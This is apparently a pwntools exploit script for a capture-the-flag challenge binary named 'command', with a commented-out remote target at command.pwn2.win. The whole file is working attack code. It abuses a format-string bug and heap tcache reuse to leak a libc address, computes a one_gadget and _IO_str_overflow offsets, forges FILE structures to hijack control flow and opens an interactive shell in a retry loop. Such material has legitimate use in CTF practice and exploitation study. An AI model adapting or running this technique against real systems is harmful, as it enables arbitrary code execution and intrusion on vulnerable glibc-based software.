from pwn import *
from pwn import log as Log
from time import sleep


def log(title,value):
    Log.info(title + ": {} ".format(hex(value)))
period = 0.05

def include(priority,command):
    p.sendline("1")
    p.recv(8000)
    p.sendline(str(priority))
    p.recv(8000)
    p.send(command)
    sleep(period)
    p.recv(8000)


def review(index):
    p.sendline("2")
    p.recv(8000)
    p.sendline(str(index))
    p.recvuntil("Command: ")
    data = p.recvline().strip()
    p.recv(8000)
    return data

def delete(index):
    p.sendline("3")
    p.recv(8000)
    p.sendline(str(index))
    p.recv(8000)

def init(name):
    p.sendline(name)
    p.recv(8000)


for _ in range(100):
    p = process("./command")
    #p=remote("command.pwn2.win",1337)
    p.recv(8000)
    payload = ""
    payload += "%4$hn"
    init(payload)

    for i in range(9):
        include(123,"abc")
    for i in range(8):
        delete(i)

    for i in range(7):
        include(123,chr(65+i)*3)

    include(123,"a")





    data = review(7)
    leak = u64(data.ljust(8,"\x00"))
    leak = leak & 0xffffffffffffff00
    leak = leak | 0xa0
    log("leak",leak)
    base = leak - 0x3ebca0
    str_overflow = base + 0x3e8378
    one_gadget = base + 0x4f322
    _IO_lock=base+0x3ed8b0
    log("base",base)
    log("str_overflow",str_overflow)
    log("one_gadget",one_gadget)
    include(123,"KKKKKKKKKKKKK")

    fake1=""
    fake1+=p64(0xfbad2400)
    fake1+=p64(0)*8
    fake1+=p64(0)*2

    fake2=p64(_IO_lock)*3
    fake2+=p64(0xffffffffffffffff)
    fake2+=p64(0)
    fake2+=p64(0)
    fake2+=p64(0)*6
    fake2+=p64(str_overflow-136)
    fake2+=p64(one_gadget)

    for i in range(10):
        delete(i)

    for i in range(8):
        include(123,"A"*5)

    include(0,"A"*280+fake1)
    include(0,fake2)
    p.sendline("5")
    p.sendline("1")
    
    try:
        p.sendline("id")
        p.interactive()
    except:
        c=0
    p.close()
    